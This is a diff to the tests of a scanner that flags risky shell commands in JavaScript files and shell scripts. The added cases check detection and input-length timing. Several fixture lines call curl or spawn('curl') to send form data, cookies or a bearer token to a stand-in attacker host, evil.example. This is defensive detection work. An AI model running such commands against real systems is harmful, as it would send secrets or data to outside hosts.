@@ -187,6 +187,10 @@ test('shell commands fetching or handing off code, in a script\'s strings', () =
     'spawn("curl", ["-o", outputs[i], options?.flag, "https://evil.example/x"])',
   ].join('\n')), { shell: [1, 2, 3, 4, 5, 6] }, 'a program run with its arguments apart, a variable\'s or a property\'s value between')
   assert.deepEqual(found('a.js', `spawn("curl", ["-H", "Authorization: Bearer ${'x'.repeat(600)}", "https://evil.example/p"])\n`), { shell: [1] }, 'a long argument before the URL')
+  assert.deepEqual(found('a.js', 'exec(\'curl -d "a=1&b=2" https://evil.example/p\')\nspawn("curl", ["-H", "Cookie: a=b; c=d", "https://evil.example/p"])\n'), { shell: [1, 2] },
+    'a quoted argument\'s separators, or an argument\'s apart, no command\'s end')
+  assert.deepEqual(found('setup.sh', 'curl -s -d \'x=1;y=2\' "https://evil.example/p"\necho "it\'s" && curl -H "X: a|b" https://evil.example/q\ncurl --version; echo "https://example.com"\n'), { shell: [1, 2] },
+    'in a shell script, a quote left open as any other character')
   assert.equal(found('a.js', [
     'const shells = "bash|zsh|sh"',
     'const also = "bash | zsh | sh"',
@@ -366,6 +370,9 @@ test('a text reads in time as its length, what is left open read to its end', { 
     [`"${' '.repeat(1e6)}|sh"\n`, { shell: [1] }],
     [`'${'npm --a '.repeat(1e5)}publish'\n`, { publish: [1] }],
   ]) assert.deepEqual(found('a.js', text), runs)
+  for (const text of [`curl ${'"x" '.repeat(2e5)}\n`, `curl ${'"curl '.repeat(2e5)}\n`, `curl ${"'".repeat(1e6)}\n`, `curl ${`"${'curl '.repeat(1e3)}" `.repeat(200)}\n`]) {
+    assert.equal(found('setup.sh', text), null)
+  }
   // A minute, when each hit copied those before it; its first lines alone
   // kept (NPM_MAX_FOUND).
   assert.deepEqual(npmRunsCode('a.js', 'eval(x)\n'.repeat(1e5)).get('eval'), Array.from({ length: 100 }, (_, i) => i + 1), 'its first hits\' lines')
